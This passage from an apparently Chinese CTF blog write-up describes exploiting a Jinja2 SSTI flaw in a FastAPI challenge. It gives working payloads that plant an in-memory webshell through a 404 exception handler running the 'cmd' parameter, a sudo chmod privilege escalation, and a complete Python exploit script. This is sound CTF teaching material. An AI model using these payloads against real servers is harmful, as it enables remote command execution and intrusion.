class="params">username=<span class="string">&quot;Guest&quot;</span></span>):</span><br><span class="line">    Jinja2.from_string(<span class="string">&quot;Welcome &quot;</span> + username).render()</span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(content=<span class="string">&quot;&lt;h1&gt;Welcome!&lt;/h1&gt;&lt;p&gt;Request processed.&lt;/p&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">method_disabled</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;此路不通！该方法已被管理员禁用。&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.add_api_route = method_disabled</span><br><span class="line">app.add_middleware = method_disabled</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    uvicorn.run(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很明显的SSTI漏洞，换了渲染符，所以可以使用 {} ，但是现在有问题，无回显，并且不出网，需要打内</p>
<p>存马，然而禁用了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.add_api_route = method_disabled</span><br><span class="line">app.add_middleware = method_disabled</span><br></pre></td></tr></table></figure>

<p>也就是说动态添加路由和中间件注册这两种方法都不能使用，但是可以使用异常处理器</p>
<p>注意到start.sh文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> uvicorn app:app --host 0.0.0.0 --port 8000</span><br></pre></td></tr></table></figure>

<p>也就是说应用不是由<code>__main__</code>启动的，所以如果我们使用<code>__main__</code>的话是获取不到app对象的，所以需要修改成app对象才能获取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先添加恶意的异常处理器</span></span><br><span class="line">&#123;lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">(<span class="string">&quot;sys.modules[&#x27;app&#x27;].app.add_exception_handler(404,lambda request,</span></span><br><span class="line"><span class="string">exc:sys.modules[&#x27;app&#x27;].app.__init__.__globals__[&#x27;JSONResponse&#x27;](content=</span></span><br><span class="line"><span class="string">&#123;&#x27;message&#x27;:__import__(&#x27;os&#x27;).popen(request.query_params.get(&#x27;cmd&#x27;) or</span></span><br><span class="line"><span class="string">&#x27;whoami&#x27;).read()&#125;))&quot;</span>)&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">## 再重新构建 middleware_stack</span></span><br><span class="line">&#123;lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line">(<span class="string">&quot;app=sys.modules[&#x27;app&#x27;].app;app.middleware_stack=app.build_middleware_stack()&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>

<p>成功注册内存马后，随便访问一个错误路由触发404</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103105652382.png" alt="image-20251103105652382"></p>
<p>尝试读取flag，但是权限不够需要提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l		//找到一个/usr/bin/chmod</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 6777 /flag	//赋予flag权限</span><br><span class="line"><span class="built_in">tac</span> /flag</span><br></pre></td></tr></table></figure>

<p>最终的poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:baozongwi</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8000/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>(<span class="params">url, payload</span>):</span><br><span class="line">    res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>shellMe?username=<span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">url, payload</span>):</span><br><span class="line">    res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>123456?cmd=<span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;NSSCTF&#123;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;NSSCTF\&#123;.*?\&#125;&#x27;</span>, res.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    payload1 = <span class="string">&quot;&quot;&quot;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]</span></span><br><span class="line"><span class="string">(&quot;sys.modules[&#x27;app&#x27;].app.add_exception_handler(404,lambda request,</span></span><br><span class="line"><span class="string">exc:sys.modules[&#x27;app&#x27;].app.__init__.__globals__[&#x27;JSONResponse&#x27;](content=</span></span><br><span class="line"><span class="string">&#123;&#x27;message&#x27;:__import__(&#x27;os&#x27;).popen(request.query_params.get(&#x27;cmd&#x27;) or</span></span><br><span class="line"><span class="string">&#x27;whoami&#x27;).read()&#125;))&quot;)&#125;&quot;&quot;&quot;</span></span><br><span class="line">    get_shell(url, payload1)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">&quot;&quot;&quot;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;]</span></span><br><span class="line"><span class="string">(&quot;app=sys.modules[&#x27;app&#x27;].app;app.middleware_stack=app.build_middleware_stack()&quot;)&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    get_shell(url, payload2)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    payload3 = <span class="string">&quot;sudo chmod 6777 /flag&quot;</span></span><br><span class="line">    get_flag(url, payload3)</span><br><span class="line">    </span><br><span class="line">    payload4 = <span class="string">&quot;tac /flag&quot;</span></span><br><span class="line">    flag = get_flag(url, payload4)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = exp()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>


    </div>

    
    
    
	
	<div>
	  
		
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	  
	</div>


    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>wanTh3flag
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://wanth3f1ag.top/2025/11/02/2025%E7%8E%84%E6%AD%A6%E6%9D%AF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/" title="2025玄武杯出题记录">https://wanth3f1ag.top/2025/11/02/2025玄武杯出题记录/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/" rel="tag"># 2025玄武杯</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/11/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025wp-web/" rel="prev" title="第十六届极客大挑战wp">
                  <i class="fa fa-angle-left"></i> 第十六届极客大挑战wp
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/11/04/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/" rel="next" title="春秋云镜Initial">
                  春秋云镜Initial <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">3.6m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">54:01</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
